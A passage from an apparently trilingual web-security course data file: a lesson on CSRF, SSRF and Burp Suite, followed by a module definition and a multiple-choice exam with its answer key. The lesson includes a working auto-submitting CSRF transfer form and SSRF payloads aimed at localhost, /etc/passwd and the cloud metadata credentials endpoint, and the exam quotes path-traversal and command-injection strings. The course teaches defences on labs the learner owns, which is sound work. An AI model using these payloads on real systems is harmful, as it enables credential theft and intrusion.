        "titleUz": "CSRF, SSRF va hammani ko'rish uchun proksidan foydalanish",
        "titleRu": "CSRF, SSRF и прокси, чтобы видеть всё",
        "content": r"""Two more request-forgery flaws that trick a trusted party into acting for the attacker, and the tool that makes all web testing tractable: an intercepting proxy.

## CSRF: making the victim's browser act

Cross-Site Request Forgery abuses the fact that a browser attaches your cookies to *every* request to a site, including ones triggered by another site. If a bank has:

```
POST /transfer   amount=1000&to=attacker
```

and relies only on the session cookie, an attacker puts this on a page the victim visits:

```html
<form action="https://bank.local/transfer" method="POST" id="f">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.getElementById("f").submit();</script>
```

The victim's browser submits it *with their bank cookie attached*, because that is what browsers do. The bank sees a valid, authenticated request. The victim authorised nothing.

The defences:

- **CSRF tokens** — a random per-session value the server issues and requires on state-changing requests. The attacker's page cannot read it (same-origin policy), so it cannot forge a valid request.
- **SameSite cookies** — `SameSite=Strict` or `Lax` tells the browser not to send the cookie on cross-site requests, cutting the attack off at the source.
- **Re-checking origin** — verifying the `Origin`/`Referer` header on sensitive actions.

CSRF only works on actions driven purely by an ambient cookie. An API using a bearer token in a header is not vulnerable, because the attacker's page cannot set that header.

## SSRF: making the server act

Server-Side Request Forgery is the inverse: you make the *server* fetch a URL you choose. A "fetch this image" or "import from URL" feature that takes a full URL:

```
https://target.local/fetch?url=https://example.com/logo.png
```

Point it inward instead. The server sits behind the firewall, so it can reach things you cannot:

```
?url=http://127.0.0.1:8080/admin
?url=http://localhost/server-status
?url=file:///etc/passwd
```

On cloud infrastructure, SSRF against the metadata service is a classic critical finding, because that endpoint hands out credentials to anything that can reach it:

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The server, trusted on the internal network, becomes your proxy into it. Defences: allow-list the destinations that may be fetched, block internal ranges and `localhost`, disable unneeded URL schemes (`file://`, `gopher://`), and never return the raw response body to the user.

## Burp Suite: the intercepting proxy

Everything in this module is faster when you can see and edit every request. An intercepting proxy sits between your browser and the target: you pause a request, change any part of it, and forward it.

The workflow:

1. Point your browser's proxy at Burp (`127.0.0.1:8080`) and install its CA certificate so HTTPS can be read.
2. **Proxy → Intercept** — pause each request, edit headers, parameters or body, then forward. This is how you change a value the page would not let you change.
3. **Proxy → HTTP history** — every request the browser made, replayable.
4. **Repeater** — send one request over and over with tweaks. This is where you actually test injection: change the parameter, resend, read the response, repeat.
5. **Intruder** — automate a request across a list of payloads (the free edition is throttled, but enough to learn on).

OWASP ZAP is a capable free alternative with the same core idea. Either one turns "I think this parameter is injectable" into "I sent 40 variations in a minute and here is the one that worked".

## Bringing the module together

Every flaw here was one sentence: *input was trusted when it should not have been.* SQL injection trusts input as a query, XSS as HTML, command injection as a shell command, path traversal as a path, IDOR as an authorisation decision, SSRF as a safe URL. The defence is always the same shape — separate data from code, and check authority on the server for the specific action. Learn to see that one pattern and every new vulnerability class becomes a variation you already understand.

## Try it (on a lab you own)

1. In a proxy, capture a normal request and resend it from Repeater with one parameter changed.
2. Find a form protected by a CSRF token; remove the token in the proxy and resend. Is it rejected?
3. Find a URL-fetching feature and point it at `http://127.0.0.1/`. Does the server reach something you cannot?""",
        "contentUz": r"""Ishonchli tomonni hujumchi uchun harakat qilishga aldaydigan yana ikki so'rov-soxtalashtirish nuqsoni, va butun veb-sinovni yengillashtiradigan vosita: ushlab qoluvchi proksi.

## CSRF: jabrlanuvchi brauzerini harakatga keltirish

Saytlararo so'rov soxtalashtirish brauzer sizning cookie'laringizni saytga *har* so'rovga, jumladan boshqa sayt qo'zg'atgan so'rovga ham biriktirishidan foydalanadi. Agar bankда:

```
POST /transfer   amount=1000&to=attacker
```

bo'lsa va u faqat sessiya cookie'siga tayansa, hujumchi buni jabrlanuvchi tashrif buyuradigan sahifaga qo'yadi:

```html
<form action="https://bank.local/transfer" method="POST" id="f">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.getElementById("f").submit();</script>
```

Jabrlanuvchi brauzeri uni *bank cookie'si biriktirilgan holda* yuboradi, chunki brauzerlar shunday qiladi. Bank yaroqli, autentifikatsiyalangan so'rovni ko'radi. Jabrlanuvchi hech narsaga ruxsat bermadi.

Himoyalar:

- **CSRF tokenlari** — server bergan va holatni o'zgartiradigan so'rovlarda talab qiladigan har sessiya uchun tasodifiy qiymat. Hujumchi sahifasi uni o'qiy olmaydi (same-origin siyosati), shuning uchun yaroqli so'rovni soxtalashtira olmaydi.
- **SameSite cookie'lar** — `SameSite=Strict` yoki `Lax` brauzerga cookie'ni saytlararo so'rovlarda yubormaslikni aytadi, hujumni manbaida kesadi.
- **Origin'ni qayta tekshirish** — nozik harakatlarda `Origin`/`Referer` sarlavhasini tekshirish.

CSRF faqat sof cookie bilan boshqariladigan harakatlarda ishlaydi. Sarlavhada bearer token ishlatadigan API zaif emas, chunki hujumchi sahifasi o'sha sarlavhani o'rnata olmaydi.

## SSRF: serverni harakatga keltirish

Server tomonidagi so'rov soxtalashtirish — teskarisi: siz *serverni* o'zingiz tanlagan URL'ni olishga majbur qilasiz. To'liq URL qabul qiladigan "bu rasmni ol" yoki "URL'dan import qil" xususiyati:

```
https://target.local/fetch?url=https://example.com/logo.png
```

Buning o'rniga uni ichkariga yo'naltiring. Server ekran ortida turadi, shuning uchun u siz yeta olmaydigan narsalarga yetadi:

```
?url=http://127.0.0.1:8080/admin
?url=http://localhost/server-status
?url=file:///etc/passwd
```

Bulut infratuzilmasida metama'lumot xizmatiga qarshi SSRF — klassik kritik topilma, chunki o'sha endpoint unga yeta oladigan har narsaga hisob ma'lumotlarini beradi:

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Ichki tarmoqda ishonilgan server sizning unга proksigingizga aylanadi. Himoyalar: olinishi mumkin bo'lgan manzillarni ruxsat ro'yxatiga oling, ichki diapazonlar va `localhost` ni bloklang, keraksiz URL sxemalarini (`file://`, `gopher://`) o'chiring va xom javob tanasini foydalanuvchiga hech qachon qaytarmang.

## Burp Suite: ushlab qoluvchi proksi

Bu moduldagi hamma narsa har bir so'rovni ko'rib, tahrirlay olganingizda tezroq. Ushlab qoluvchi proksi brauzeringiz va nishon orasida turadi: so'rovni to'xtatasiz, uning istalgan qismini o'zgartirasiz va uzatasiz.

Ish tartibi:

1. Brauzeringiz proksisini Burp'ga (`127.0.0.1:8080`) yo'naltiring va uning CA sertifikatini o'rnating, shunda HTTPS o'qiladi.
2. **Proxy → Intercept** — har bir so'rovni to'xtating, sarlavhalar, parametrlar yoki tanani tahrirlang, keyin uzating. Sahifa o'zgartirishga yo'l qo'ymaydigan qiymatni shunday o'zgartirasiz.
3. **Proxy → HTTP history** — brauzer qilgan har bir so'rov, qayta yuboriladigan.
4. **Repeater** — bitta so'rovni o'zgartirishlar bilan qayta-qayta yuborish. In'ektsiyani aslida shu yerda sinaysiz: parametrni o'zgartiring, qayta yuboring, javobni o'qing, takrorlang.
5. **Intruder** — so'rovni payload'lar ro'yxati bo'ylab avtomatlashtirish (bepul nashri sekinlashtirilgan, lekin o'rganishga yetarli).

OWASP ZAP — xuddi shu asosiy g'oyali qobiliyatli bepul muqobil. Ikkalasi ham "menimcha bu parametr in'ektsiyalanadigan"ni "bir daqiqada 40 variant yubordim va mana ishlaganini"ga aylantiradi.

## Modulni birlashtirish

Bu yerdagi har bir nuqson bitta jumla edi: *kirishga ishonmaslik kerak bo'lganda ishonildi.* SQL in'ektsiya kirishga so'rov sifatida, XSS HTML sifatida, buyruq in'ektsiyasi shell buyrug'i sifatida, yo'ldan chiqish yo'l sifatida, IDOR avtorizatsiya qarori sifatida, SSRF xavfsiz URL sifatida ishonadi. Himoya doim bir xil shaklda — ma'lumotni koddan ajrating va aniq harakat uchun vakolatni serverда tekshiring. Shu bitta naqshni ko'rishni o'rganing va har bir yangi zaiflik sinfi siz allaqachon tushunadigan variatsiyaga aylanadi.

## Sinab ko'ring (o'z laboratoriyangizda)

1. Proksida oddiy so'rovni oling va uni Repeater'dan bitta parametr o'zgartirilgan holda qayta yuboring.
2. CSRF token bilan himoyalangan formani toping; proksida tokenni olib tashlang va qayta yuboring. Rad etiladimi?
3. URL oladigan xususiyatni toping va uni `http://127.0.0.1/` ga yo'naltiring. Server siz yeta olmaydigan narsaga yetadimi?""",
        "contentRu": r"""Ещё два дефекта подделки запросов, обманом заставляющие доверенную сторону действовать за атакующего, и инструмент, делающий всё веб-тестирование посильным: перехватывающий прокси.

## CSRF: заставить браузер жертвы действовать

Межсайтовая подделка запроса злоупотребляет тем, что браузер прикрепляет ваши cookie к *каждому* запросу к сайту, включая запущенные другим сайтом. Если у банка есть:

```
POST /transfer   amount=1000&to=attacker
```

и он полагается только на cookie сессии, атакующий кладёт это на страницу, которую посещает жертва:

```html
<form action="https://bank.local/transfer" method="POST" id="f">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.getElementById("f").submit();</script>
```

Браузер жертвы отправляет это *с прикреплённой банковской cookie*, потому что браузеры так делают. Банк видит валидный аутентифицированный запрос. Жертва ничего не авторизовала.

Защиты:

- **CSRF-токены** — случайное значение на сессию, которое сервер выдаёт и требует на изменяющих состояние запросах. Страница атакующего не может его прочитать (политика одного источника), поэтому не подделает валидный запрос.
- **SameSite cookie** — `SameSite=Strict` или `Lax` говорит браузеру не слать cookie в межсайтовых запросах, обрубая атаку у источника.
- **Перепроверка origin** — проверка заголовка `Origin`/`Referer` на чувствительных действиях.

CSRF работает только на действиях, управляемых чисто окружающей cookie. API с bearer-токеном в заголовке не уязвим, потому что страница атакующего не может задать этот заголовок.

## SSRF: заставить сервер действовать

Подделка запроса на стороне сервера — обратное: вы заставляете *сервер* запросить выбранный вами URL. Функция «забрать эту картинку» или «импорт по URL», принимающая полный URL:

```
https://target.local/fetch?url=https://example.com/logo.png
```

Направьте её внутрь. Сервер за файрволом, поэтому достаёт то, что недоступно вам:

```
?url=http://127.0.0.1:8080/admin
?url=http://localhost/server-status
?url=file:///etc/passwd
```

В облачной инфраструктуре SSRF против сервиса метаданных — классическая критическая находка, потому что этот эндпоинт раздаёт учётные данные всему, что до него дотянется:

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Сервер, которому доверяют во внутренней сети, становится вашим прокси в неё. Защиты: allow-list разрешённых для запроса адресов, блокировка внутренних диапазонов и `localhost`, отключение ненужных схем URL (`file://`, `gopher://`) и никогда не возвращать сырое тело ответа пользователю.

## Burp Suite: перехватывающий прокси

Всё в этом модуле быстрее, когда вы видите и правите каждый запрос. Перехватывающий прокси стоит между браузером и целью: вы ставите запрос на паузу, меняете любую его часть и пересылаете.

Рабочий процесс:

1. Направьте прокси браузера на Burp (`127.0.0.1:8080`) и установите его CA-сертификат, чтобы читать HTTPS.
2. **Proxy → Intercept** — пауза на каждом запросе, правка заголовков, параметров или тела, затем пересылка. Так вы меняете значение, которое страница менять не даёт.
3. **Proxy → HTTP history** — каждый сделанный браузером запрос, воспроизводимый.
4. **Repeater** — слать один запрос снова и снова с правками. Здесь вы реально тестируете инъекцию: измените параметр, перешлите, прочитайте ответ, повторите.
5. **Intruder** — автоматизация запроса по списку пейлоадов (бесплатная версия замедлена, но для учёбы хватает).

OWASP ZAP — способная бесплатная альтернатива с той же основной идеей. Любой превращает «кажется, этот параметр инъектируем» в «я послал 40 вариаций за минуту, и вот сработавшая».

## Собираем модуль воедино

Каждый дефект здесь был одной фразой: *вводу доверяли там, где не следовало.* SQL-инъекция доверяет вводу как запросу, XSS как HTML, инъекция команд как команде оболочки, обход пути как пути, IDOR как решению об авторизации, SSRF как безопасному URL. Защита всегда одной формы — отделить данные от кода и проверить полномочия на сервере для конкретного действия. Научитесь видеть этот один паттерн, и каждый новый класс уязвимостей станет вариацией того, что вы уже понимаете.

## Попробуйте (на своей лаборатории)

1. В прокси захватите обычный запрос и перешлите из Repeater с одним изменённым параметром.
2. Найдите форму, защищённую CSRF-токеном; уберите токен в прокси и перешлите. Отклонён ли он?
3. Найдите функцию запроса по URL и направьте её на `http://127.0.0.1/`. Достаёт ли сервер то, что недоступно вам?""",
        "questions": [
            q("Why is an API that authenticates with a bearer token in a header not vulnerable to CSRF?",
              "Nega sarlavhada bearer token bilan autentifikatsiya qiladigan API CSRF'ga zaif emas?",
              "Почему API с аутентификацией bearer-токеном в заголовке не уязвим к CSRF?",
              ["The attacker's page cannot set that header on a cross-site request",
               "Bearer tokens are encrypted", "APIs are never targeted by CSRF",
               "The token is stored in a cookie"],
              ["Hujumchi sahifasi saytlararo so'rovda o'sha sarlavhani o'rnata olmaydi",
               "Bearer tokenlar shifrlangan", "API'lar hech qachon CSRF nishoni bo'lmaydi",
               "Token cookie'da saqlanadi"],
              ["Страница атакующего не может задать этот заголовок в межсайтовом запросе",
               "Bearer-токены зашифрованы", "API никогда не цель CSRF",
               "Токен хранится в cookie"], 0),
            q("An SSRF payload of `http://169.254.169.254/...` on cloud targets:",
              "Bulutda `http://169.254.169.254/...` SSRF payload'i nimani nishonga oladi:",
              "SSRF-пейлоад `http://169.254.169.254/...` в облаке целится в:",
              ["The cloud metadata service, which can leak credentials", "The public internet gateway",
               "The user's own browser", "The DNS resolver"],
              ["Hisob ma'lumotlarini sizdira oladigan bulut metama'lumot xizmatini", "Ommaviy internet shlyuzini",
               "Foydalanuvchining o'z brauzerini", "DNS resolverni"],
              ["Сервис метаданных облака, способный слить учётные данные", "Публичный интернет-шлюз",
               "Собственный браузер пользователя", "DNS-резолвер"], 0),
            q("Which Burp Suite feature is used to resend one request repeatedly with tweaks?",
              "Bitta so'rovni o'zgartirishlar bilan qayta-qayta yuborish uchun qaysi Burp Suite xususiyati ishlatiladi?",
              "Какая функция Burp Suite используется, чтобы слать один запрос многократно с правками?",
              ["Repeater", "Intercept", "HTTP history", "Decoder"],
              ["Repeater", "Intercept", "HTTP history", "Decoder"],
              ["Repeater", "Intercept", "HTTP history", "Decoder"], 0),
        ],
    },
]


MODULE = {
    "slug": "web-application-security",
    "category": "web",
    "title": "Web Application Security",
    "titleUz": "Veb-ilova xavfsizligi",
    "titleRu": "Безопасность веб-приложений",
    "description": (
        "The web vulnerabilities that matter, taught around one idea: input trusted when it should not be. "
        "The request/response model, enumeration, SQL injection, XSS, broken authentication and access control, "
        "IDOR, file uploads, path traversal, command injection, CSRF and SSRF, and driving it all with an "
        "intercepting proxy. Every attack is shown so you can find the defect and fix it — on targets you own."
    ),
    "descriptionUz": (
        "Muhim veb-zaifliklar, bitta g'oya atrofida o'rgatilgan: kirishga ishonmaslik kerak bo'lganda ishonish. "
        "So'rov/javob modeli, sanash, SQL in'ektsiya, XSS, buzilgan autentifikatsiya va kirish nazorati, "
        "IDOR, fayl yuklash, yo'ldan chiqish, buyruq in'ektsiyasi, CSRF va SSRF, va hammasini ushlab qoluvchi "
        "proksi bilan boshqarish. Har bir hujum nuqsonni topib tuzatish uchun ko'rsatiladi — o'zingizniki nishonlarda."
    ),
    "descriptionRu": (
        "Веб-уязвимости, которые важны, вокруг одной идеи: вводу доверяют там, где не следует. "
        "Модель запрос/ответ, перечисление, SQL-инъекция, XSS, сломанная аутентификация и контроль доступа, "
        "IDOR, загрузка файлов, обход пути, инъекция команд, CSRF и SSRF, и управление всем этим через "
        "перехватывающий прокси. Каждая атака показана, чтобы найти дефект и исправить его — на своих целях."
    ),
    "difficulty": "intermediate",
    "estimatedHours": 45,
    "passScore": 80,
    "orderIndex": 2,
    "exam": [
        q("Almost every web vulnerability comes down to which single failure?",
          "Deyarli har bir veb-zaiflik qaysi bitta nosozlikка borib taqaladi?",
          "Почти любая веб-уязвимость сводится к какому одному сбою?",
          ["Trusting input that should not be trusted", "Using HTTP instead of HTTPS",
           "Weak passwords", "Slow servers"],
          ["Ishonmaslik kerak bo'lgan kirishga ishonish", "HTTPS o'rniga HTTP ishlatish",
           "Zaif parollar", "Sekin serverlar"],
          ["Доверие вводу, которому нельзя доверять", "Использование HTTP вместо HTTPS",
           "Слабые пароли", "Медленные серверы"], 0),
        q("Why can a client-side validation never be relied on for security?",
          "Nega mijoz tomonidagi tekshiruvга xavfsizlik uchun hech qachon tayanib bo'lmaydi?",
          "Почему на клиентскую валидацию никогда нельзя полагаться в безопасности?",
          ["The user controls the client and can bypass it, e.g. with curl",
           "JavaScript is too slow", "Browsers disable it by default",
           "It only works over HTTPS"],
          ["Foydalanuvchi mijozni boshqaradi va uni chetlab o'ta oladi, masalan curl bilan",
           "JavaScript juda sekin", "Brauzerlar uni sukut bo'yicha o'chiradi",
           "U faqat HTTPS orqali ishlaydi"],
          ["Пользователь управляет клиентом и может обойти, например curl",
           "JavaScript слишком медленный", "Браузеры отключают её по умолчанию",
           "Она работает только по HTTPS"], 0),
        q("A gobuster hit returns status 403. It means the path:",
          "gobuster natijasi 403 holatini qaytardi. Bu yo'l:",
          "Результат gobuster вернул статус 403. Это значит, путь:",
          ["Exists but access is forbidden", "Does not exist",
           "Is readable to everyone", "Redirects elsewhere"],
          ["Mavjud, lekin kirish taqiqlangan", "Mavjud emas",
           "Hammaga o'qiladi", "Boshqa joyga yo'naltiradi"],
          ["Существует, но доступ запрещён", "Не существует",
           "Читается всем", "Перенаправляет"], 0),
        q("The real fix for SQL injection is:",
          "SQL in'ektsiyaning haqiqiy davosi:",
          "Настоящее исправление SQL-инъекции:",
          ["Parameterised queries", "Hiding error messages",
           "A web application firewall", "Blocking single quotes"],
          ["Parametrlangan so'rovlar", "Xato xabarlarini yashirish",
           "Veb-ilova ekrani", "Bitta tirnoqlarni bloklash"],
          ["Параметризованные запросы", "Скрытие сообщений об ошибках",
           "WAF", "Блокировка одинарных кавычек"], 0),
        q("Stored XSS is more dangerous than reflected XSS because:",
          "Saqlangan XSS aks etgan XSS'dan xavfliroq, chunki:",
          "Хранимый XSS опаснее отражённого, потому что:",
          ["It is served to every visitor without needing a crafted link",
           "It runs faster", "It cannot be encoded away",
           "It only affects administrators"],
          ["U yasalgan havolasiz har bir tashrif buyuruvchiga beriladi",
           "U tezroq ishlaydi", "Uni kodlab yo'q qilib bo'lmaydi",
           "U faqat administratorlarga ta'sir qiladi"],
          ["Он отдаётся каждому посетителю без крафтовой ссылки",
           "Он работает быстрее", "Его нельзя убрать кодированием",
           "Он затрагивает только администраторов"], 0),
        q("Which cookie flag prevents JavaScript from reading a session cookie?",
          "Qaysi cookie bayrog'i JavaScript'ning sessiya cookie'sini o'qishini oldini oladi?",
          "Какой флаг cookie не даёт JavaScript прочитать cookie сессии?",
          ["HttpOnly", "Secure", "SameSite", "Path"],
          ["HttpOnly", "Secure", "SameSite", "Path"],
          ["HttpOnly", "Secure", "SameSite", "Path"], 0),
        q("Changing `?id=1043` to `?id=1044` and seeing another user's data is:",
          "`?id=1043` ni `?id=1044` ga o'zgartirib, boshqa foydalanuvchi ma'lumotini ko'rish:",
          "Смена `?id=1043` на `?id=1044` и просмотр чужих данных — это:",
          ["IDOR — broken object-level access control", "SQL injection",
           "Reflected XSS", "Session fixation"],
          ["IDOR — buzilgan obyekt darajasidagi kirish nazorati", "SQL in'ektsiya",
           "Aks etgan XSS", "Sessiya fiksatsiyasi"],
          ["IDOR — сломанный контроль доступа на уровне объекта", "SQL-инъекция",
           "Отражённый XSS", "Фиксация сессии"], 0),
        q("An authorisation check should be based on:",
          "Avtorizatsiya tekshiruvi nimaga asoslanishi kerak:",
          "Проверка авторизации должна основываться на:",
          ["The session identity, deciding may this user touch this object",
           "The id sent in the request", "Whether the UI shows the link",
           "The User-Agent string"],
          ["Sessiya shaxsiga — bu foydalanuvchi bu obyektga tega oladimi",
           "So'rovda yuborilgan id'ga", "UI havolani ko'rsatadimi",
           "User-Agent satriga"],
          ["Личности из сессии — может ли этот пользователь трогать этот объект",
           "Id, присланном в запросе", "Показывает ли UI ссылку",
           "Строке User-Agent"], 0),
        q("`?file=../../../../etc/passwd` is an attempt at:",
          "`?file=../../../../etc/passwd` nimaga urinish:",
          "`?file=../../../../etc/passwd` — это попытка:",
          ["Path traversal", "SQL injection", "CSRF", "SSRF"],
          ["Yo'ldan chiqish", "SQL in'ektsiya", "CSRF", "SSRF"],
          ["Обхода пути", "SQL-инъекции", "CSRF", "SSRF"], 0),
        q("Uploading `shell.php` and calling it to run commands is possible when:",
          "`shell.php` yuklab, uni buyruq ishlatish uchun chaqirish qachon mumkin:",
          "Загрузить `shell.php` и вызвать его для выполнения команд возможно, когда:",
          ["The upload directory can execute scripts and the type check is weak",
           "The file is smaller than 1 MB", "The server uses HTTPS",
           "The user is an administrator"],
          ["Yuklash katalogi skript ishlata oladi va tur tekshiruvi zaif",
           "Fayl 1 MB dan kichik", "Server HTTPS ishlatadi",
           "Foydalanuvchi administrator"],
          ["Каталог загрузок может выполнять скрипты и проверка типа слаба",
           "Файл меньше 1 МБ", "Сервер использует HTTPS",
           "Пользователь — администратор"], 0),
        q("In command injection, what does appending `; sleep 5` demonstrate when no output is shown?",
          "Buyruq in'ektsiyasida chiqish ko'rsatilmaganda `; sleep 5` qo'shish nimani ko'rsatadi?",
          "В инъекции команд что показывает добавление `; sleep 5`, когда вывода нет?",
          ["That the injected command executed (blind confirmation)", "That the server is down",
           "That the input was rejected", "That the file was uploaded"],
          ["Kiritilgan buyruq bajarilganini (ko'r tasdiq)", "Server o'chiqligini",
           "Kirish rad etilganini", "Fayl yuklanganini"],
          ["Что внедрённая команда выполнилась (слепое подтверждение)", "Что сервер лежит",
           "Что ввод отклонён", "Что файл загружен"], 0),
        q("The general defence shared by SQL injection and command injection is:",
          "SQL in'ektsiya va buyruq in'ektsiyasi bo'lishadigan umumiy himoya:",
          "Общая защита, разделяемая SQL-инъекцией и инъекцией команд:",
          ["Keep data and code in separate channels", "Encrypt all traffic",
           "Rate-limit requests", "Use long passwords"],
          ["Ma'lumot va kodni alohida kanallarda saqlash", "Barcha trafikni shifrlash",
           "So'rovlarni tezlik bo'yicha cheklash", "Uzun parollar ishlatish"],
          ["Держать данные и код в разных каналах", "Шифровать весь трафик",
           "Ограничивать частоту запросов", "Использовать длинные пароли"], 0),
        q("CSRF is only possible when a state-changing action is authorised by:",
          "CSRF faqat holatni o'zgartiradigan harakat nima bilan avtorizatsiya qilinganda mumkin:",
          "CSRF возможен только когда изменяющее состояние действие авторизуется:",
          ["An ambient cookie the browser sends automatically",
           "A bearer token in a header", "A one-time code by SMS",
           "A client certificate"],
          ["Brauzer avtomatik yuboradigan cookie bilan",
           "Sarlavhadagi bearer token bilan", "SMS orqali bir martalik kod bilan",
           "Mijoz sertifikati bilan"],
          ["Окружающей cookie, которую браузер шлёт автоматически",
           "Bearer-токеном в заголовке", "Одноразовым кодом по SMS",
           "Клиентским сертификатом"], 0),
        q("SSRF turns the server into:",
          "SSRF serverni nimaga aylantiradi:",
          "SSRF превращает сервер в:",
          ["A proxy that fetches internal URLs the attacker cannot reach directly",
           "A database", "A web shell", "A DNS server"],
          ["Hujumchi to'g'ridan-to'g'ri yeta olmaydigan ichki URL'larni oladigan proksi",
           "Ma'lumotlar bazasi", "Veb-shell", "DNS server"],
          ["Прокси, забирающий внутренние URL, недоступные атакующему напрямую",
           "Базу данных", "Веб-шелл", "DNS-сервер"], 0),
        q("Which tool lets you pause, edit and resend individual HTTP requests?",
          "Qaysi vosita alohida HTTP so'rovlarni to'xtatish, tahrirlash va qayta yuborish imkonini beradi?",
          "Какой инструмент позволяет ставить на паузу, править и пересылать отдельные HTTP-запросы?",
          ["An intercepting proxy such as Burp Suite or ZAP", "nmap",
           "tcpdump", "gobuster"],
          ["Burp Suite yoki ZAP kabi ushlab qoluvchi proksi", "nmap",
           "tcpdump", "gobuster"],
          ["Перехватывающий прокси вроде Burp Suite или ZAP", "nmap",
           "tcpdump", "gobuster"], 0),
    ],
}
